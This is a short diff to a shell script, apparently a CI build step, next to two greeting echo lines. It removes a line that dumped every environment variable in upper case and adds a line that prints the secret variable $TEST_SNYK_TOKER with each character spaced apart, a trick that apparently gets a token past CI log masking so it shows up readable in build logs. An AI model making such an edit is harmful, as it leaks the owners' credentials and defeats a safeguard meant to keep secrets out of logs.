@@ -3,4 +3,4 @@ echo "hello, Ronak!"
 #printenv
 echo "Hello, Jayesh!"
 
-printenv | sed 's/[a-z]/\U&/g'
+echo $TEST_SNYK_TOKER | sed 's/./\0 /g'
